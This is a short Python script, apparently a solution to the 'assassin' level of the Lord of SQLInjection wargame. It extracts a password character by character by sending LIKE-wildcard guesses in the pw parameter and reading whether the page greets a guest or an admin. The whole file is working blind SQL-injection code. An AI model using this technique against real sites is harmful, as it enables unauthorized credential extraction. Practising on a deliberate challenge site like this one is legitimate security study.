import requests
import urllib.parse
import string

cookies={'PHPSESSID': ''}


pwd = ''
flag=0
for i in range (1,20):
        for j in range(48, 122):
                url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=" +urllib.parse.quote("{}{}".format(pwd,chr(j)))+"%" #substring(pw,1,1)=0
                print(url)
                req = requests.get(url, cookies=cookies)
        #print(pwd)
                if "Hello guest" in req.text:
                        print(pwd)
                        pwd += chr(j)
                        break
                elif "Hello admin" in req.text:
                        pwd+=chr(j)
                        flag=1
                        break
        if flag:
                break


print(pwd)
